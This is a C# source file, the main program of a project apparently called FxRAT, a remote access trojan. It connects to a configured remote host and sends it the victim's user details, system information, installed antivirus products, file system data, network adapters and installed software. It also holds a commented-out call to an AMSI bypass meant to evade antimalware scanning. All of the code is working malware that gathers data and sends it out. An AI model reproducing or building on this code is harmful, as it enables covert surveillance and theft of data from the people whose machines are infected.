using FxRAT.Utils;
using Lib;

namespace FxRAT;

class Program
{
    static void Main()
    {

        Connection connection = new Connection(Settings.host, Settings.port);
        
        //new AMSI().bypass();
        
        connection.Connect();
        
        foreach (var userInfo in OSUtils.GetUserInformation())
        {
            connection.Write(userInfo + "\n");
        }
        
        Console.Write("System Info: \n");
        foreach (var sysInfo in OSUtils.GetSystemInformation())
        {
            connection.Write(sysInfo + "\n");
        }
        
        Console.Write("Anti Virus: \n");
        foreach (var antiVirus in OSUtils.GetAntivirusSoftware())
        {
            connection.Write(antiVirus + "\n");
        }
        
        Console.Write("File System Info: \n");
        foreach (var fileSys in OSUtils.GetFileSystemInformation())
        {
            connection.Write(fileSys);
        }
        
        Console.Write("Network Info: \n");
        foreach (var network in OSUtils.GetNetworkAdapterInformation())
        {
            connection.Write(network + "\n");
        }
        
        connection.Write("\n");
        
        Console.Write("Installed Software: \n");
        foreach (var software in OSUtils.GetInstalledSoftwareInformation())
        {
            connection.Write(software + "\n");
        }
    }
}

